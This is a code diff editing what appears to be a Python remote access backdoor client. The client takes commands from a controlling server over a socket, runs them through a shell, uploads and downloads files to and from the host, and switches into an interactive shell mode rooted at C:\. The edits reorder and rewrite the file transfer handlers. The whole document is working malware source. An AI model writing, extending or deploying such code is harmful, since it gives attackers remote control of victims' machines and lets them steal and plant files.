@@ -12,15 +12,15 @@ def execute_command(command):
     # Execute the command and return the result
     return subprocess.run(command, shell=True, capture_output=True)
 
-def send_json(sock, data):
+def send_json(socket, data):
     json_data = json.dumps(data)
-    sock.send(json_data.encode())
+    socket.send(json_data.encode())
 
-def receive_json(sock):
+def receive_json(socket):
     json_data = ""
     while True:
         try:
-            json_data = json_data + sock.recv(1024).decode()
+            json_data = json_data + socket.recv(1024).decode()
             return json.loads(json_data)
         except ValueError:
             continue
@@ -55,33 +55,33 @@ try:
         # Receive the command from the server
         command = sock.recv(1024).decode("utf-8").strip()
 
-        # Handle upload/download commands
-        if command.startswith("download"):
-            _, file_name = command.split(" ", 1)
-            try:
-                file_content = read_file(file_name)
-                send_json(sock, file_content)
-            except Exception as e:
-                send_json(sock, f"[+] Error: {e} [+]")
-            continue
-
-        if command.startswith("upload"):
-            try:
-                _, file_name, file_content = receive_json(sock)
-                send_json(sock, write_file(file_name, file_content))
-            except Exception as e:
-                send_json(sock, f"[+] Error: {e} [+]")
-            continue
-
         # Handle the 'km' command to completely disconnect
         if command.lower() == "km":
             sock.sendall("Disconnecting...\n".encode("utf-8"))
             sock.close()
             break
 
+        # Handle upload and download commands
+        if command.startswith("upload"):
+            try:
+                _, filepath, file_content = receive_json(sock)
+                response = write_file(filepath, file_content)
+            except Exception:
+                response = "[+] Error during upload [+]"
+            send_json(sock, response)
+            continue
+
+        if command.startswith("download"):
+            try:
+                _, filepath = receive_json(sock)
+                response = read_file(filepath)
+            except Exception:
+                response = "[+] Error during download [+]"
+            send_json(sock, response)
+            continue
+
         # Handle the 'shell' command to enter the shell mode
         if command.lower() == "shell":
-            # Switch to the C:\ directory
             try:
                 os.chdir("C:\\")
                 in_shell_mode = True  # Enable shell mode
